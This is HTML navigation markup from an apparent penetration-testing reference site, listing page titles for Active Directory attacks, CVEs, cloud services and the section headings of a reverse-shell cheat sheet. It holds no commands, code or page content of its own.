  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/kerberos-delegation-rbcd/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Kerberos Delegation - Resource Based Constrained Delegation
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/kerberos-delegation-unconstrained/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Kerberos Delegation - Unconstrained Delegation
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/kerberos-s4u/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Kerberos - Service for User Extension
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/kerberos-tickets/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Kerberos - Tickets
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/pwd-comments/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Password - AD User Comment
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/pwd-dsrm-credentials/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Password - DSRM Credentials
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/pwd-group-policy-preferences/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Password - Group Policy Preferences
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/pwd-precreated-computer/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Password - Pre-Created Computer Account
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/pwd-read-dmsa/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Password - dMSA
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/pwd-read-gmsa/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Password - GMSA
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/pwd-read-laps/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Password - LAPS
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/pwd-shadow-credentials/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Password - Shadow Credentials
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/pwd-spraying/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Password - Spraying
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/trust-pam/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Trust - Privileged Access Management
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/trust-relationship/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Trust - Relationship
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/trust-sid-hijacking/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Child Domain to Forest Compromise - SID Hijacking
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/trust-ticket/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Forest to Forest Compromise - Trust Ticket
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_67" >
        
          
          <label class="md-nav__link" for="__nav_3_67" id="__nav_3_67_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    CVE
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_67_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_67">
            <span class="md-nav__icon md-icon"></span>
            
  
    CVE
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/CVE/MS14-068/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    MS14-068 Checksum Validation
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/CVE/NoPAC/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    NoPAC / samAccountName Spoofing
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/CVE/PrintNightmare/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    PrintNightmare
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/CVE/PrivExchange/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    PrivExchange
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/CVE/ZeroLogon/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    ZeroLogon
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" checked>
        
          
          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Cheatsheets
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            
  
    Cheatsheets
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../as-400/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    AS400
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../escape-breakout/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Kiosk Escape and Jail Breakout
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../hash-cracking/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Hash Cracking
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../liferay/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Liferay
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../mimikatz-cheatsheet/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Mimikatz
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../miscellaneous-tricks/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Miscellaneous &amp; Tricks
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../network-discovery/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Network Discovery
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../powershell-cheatsheet/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Powershell
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../shell-bind-cheatsheet/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Bind Shell
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  
  <span class="md-ellipsis">
    
  
    Reverse Shell Cheat Sheet
  

    
  </span>
  
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  
  <span class="md-ellipsis">
    
  
    Reverse Shell Cheat Sheet
  

    
  </span>
  
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#summary" class="md-nav__link">
    <span class="md-ellipsis">
      
        Summary
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#tools" class="md-nav__link">
    <span class="md-ellipsis">
      
        Tools
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reverse-shell" class="md-nav__link">
    <span class="md-ellipsis">
      
        Reverse Shell
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Reverse Shell">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#bash-tcp" class="md-nav__link">
    <span class="md-ellipsis">
      
        Bash TCP
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bash-udp" class="md-nav__link">
    <span class="md-ellipsis">
      
        Bash UDP
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#socat" class="md-nav__link">
    <span class="md-ellipsis">
      
        Socat
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#perl" class="md-nav__link">
    <span class="md-ellipsis">
      
        Perl
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#python" class="md-nav__link">
    <span class="md-ellipsis">
      
        Python
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#php" class="md-nav__link">
    <span class="md-ellipsis">
      
        PHP
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ruby" class="md-nav__link">
    <span class="md-ellipsis">
      
        Ruby
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rust" class="md-nav__link">
    <span class="md-ellipsis">
      
        Rust
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#golang" class="md-nav__link">
    <span class="md-ellipsis">
      
        Golang
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#netcat-traditional" class="md-nav__link">
    <span class="md-ellipsis">
      
        Netcat Traditional
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#netcat-openbsd" class="md-nav__link">
    <span class="md-ellipsis">
      
        Netcat OpenBsd
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#netcat-busybox" class="md-nav__link">
    <span class="md-ellipsis">
      
        Netcat BusyBox
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ncat" class="md-nav__link">
    <span class="md-ellipsis">
      
        Ncat
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#openssl" class="md-nav__link">
    <span class="md-ellipsis">
      
        OpenSSL
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powershell" class="md-nav__link">
    <span class="md-ellipsis">
      
        Powershell
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#awk" class="md-nav__link">
    <span class="md-ellipsis">
      
        Awk
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#java" class="md-nav__link">
    <span class="md-ellipsis">
      
        Java
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Java">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#java-alternative-1" class="md-nav__link">
    <span class="md-ellipsis">
      
        Java Alternative 1
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#java-alternative-2" class="md-nav__link">
    <span class="md-ellipsis">
      
        Java Alternative 2
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#telnet" class="md-nav__link">
    <span class="md-ellipsis">
      
        Telnet
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#war" class="md-nav__link">
    <span class="md-ellipsis">
      
        War
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#lua" class="md-nav__link">
    <span class="md-ellipsis">
      
        Lua
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#nodejs" class="md-nav__link">
    <span class="md-ellipsis">
      
        NodeJS
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ognl" class="md-nav__link">
    <span class="md-ellipsis">
      
        OGNL
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#groovy" class="md-nav__link">
    <span class="md-ellipsis">
      
        Groovy
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Groovy">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#groovy-alternative-1" class="md-nav__link">
    <span class="md-ellipsis">
      
        Groovy Alternative 1
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#c" class="md-nav__link">
    <span class="md-ellipsis">
      
        C
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dart" class="md-nav__link">
    <span class="md-ellipsis">
      
        Dart
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#meterpreter-shell" class="md-nav__link">
    <span class="md-ellipsis">
      
        Meterpreter Shell
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Meterpreter Shell">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#windows-staged-reverse-tcp" class="md-nav__link">
    <span class="md-ellipsis">
      
        Windows Staged reverse TCP
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#windows-stageless-reverse-tcp" class="md-nav__link">
    <span class="md-ellipsis">
      
        Windows Stageless reverse TCP
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#linux-staged-reverse-tcp" class="md-nav__link">
    <span class="md-ellipsis">
      
        Linux Staged reverse TCP
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#linux-stageless-reverse-tcp" class="md-nav__link">
    <span class="md-ellipsis">
      
        Linux Stageless reverse TCP
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#other-platforms" class="md-nav__link">
    <span class="md-ellipsis">
      
        Other platforms
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#spawn-tty-shell" class="md-nav__link">
    <span class="md-ellipsis">
      
        Spawn TTY Shell
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#fully-interactive-reverse-shell-on-windows" class="md-nav__link">
    <span class="md-ellipsis">
      
        Fully interactive reverse shell on Windows
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    <span class="md-ellipsis">
      
        References
      
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
        
          
          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Cloud
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5">
            <span class="md-nav__icon md-icon"></span>
            
  
    Cloud
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_1" >
        
          
          <label class="md-nav__link" for="__nav_5_1" id="__nav_5_1_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Aws
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_1">
            <span class="md-nav__icon md-icon"></span>
            
  
    Aws
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/aws-access-token/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    AWS - Access Token &amp; Secrets
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/aws-cli/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    AWS - CLI
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/aws-cognito/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    AWS - Service - Cognito
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/aws-dynamodb/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    AWS - Service - DynamoDB
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/aws-ec2/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    AWS - Service - EC2
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/aws-enumeration/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    AWS - Enumerate
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/aws-iam/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    AWS - Identity &amp; Access Management
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/aws-ioc-detection/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    AWS - IOC &amp; Detections
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/aws-lambda/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    AWS - Service - Lambda &amp; API Gateway
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/aws-metadata/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    AWS - Metadata SSRF
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/aws-s3-bucket/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    AWS - Service - S3 Buckets
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/aws-ssm/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    AWS - Service - SSM
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/aws-training/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    AWS - Training
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2" >
        
          
          <label class="md-nav__link" for="__nav_5_2" id="__nav_5_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Azure
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_2">
            <span class="md-nav__icon md-icon"></span>
            
  
    Azure
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/aka-ms/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    aka.ms Shortcuts
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-access-and-token/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Azure AD - Access and Tokens
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-ad-conditional-access-policy/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Azure AD - Conditional Access Policy
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-ad-connect/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Azure AD - AD Connect and Cloud Sync
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-devices-users-sp/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Azure AD - IAM
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-enumeration/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Azure AD - Enumerate
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-persistence/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Azure AD - Persistence
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-phishing/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Azure AD - Phishing
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-requirements/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Azure - Requirements
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-services-application-endpoint/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Azure Services - Application Endpoint
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-services-application-proxy/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Azure Services - Application Proxy
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-services-container-registry/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Azure Services - Container Registry
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-services-deployment-template/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Azure Services - Deployment Template
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-services-devops/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Azure Services - Azure DevOps
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-services-keyvault/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Azure Services - KeyVault
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-services-microsoft-intune/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Azure Services - Microsoft Intune
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-services-office-365/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Azure Services - Office 365
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-services-runbook/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Azure Services - Runbook and Automation
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-services-storage-blob/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Azure Services - Storage Blob
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-services-virtual-machine/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Azure Services - Virtual Machine
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-services-web-apps/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Azure Services - Web Apps
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-services-web-domains/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Azure Services - DNS Suffix
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_3" >
        
          
          <label class="md-nav__link" for="__nav_5_3" id="__nav_5_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Ibm
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_3">
            <span class="md-nav__icon md-icon"></span>
            
  
    Ibm
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/ibm/ibm-cloud-databases/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    IBM Cloud Managed Database Services
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/ibm/ibm-cloud-object-storage/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    IBM Cloud Object Storage
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
        
          
          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Command control
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6">
            <span class="md-nav__icon md-icon"></span>
            
  
    Command control
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../command-control/cobalt-strike-beacons/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Cobalt Strike - Beacons
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../command-control/cobalt-strike-kits/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
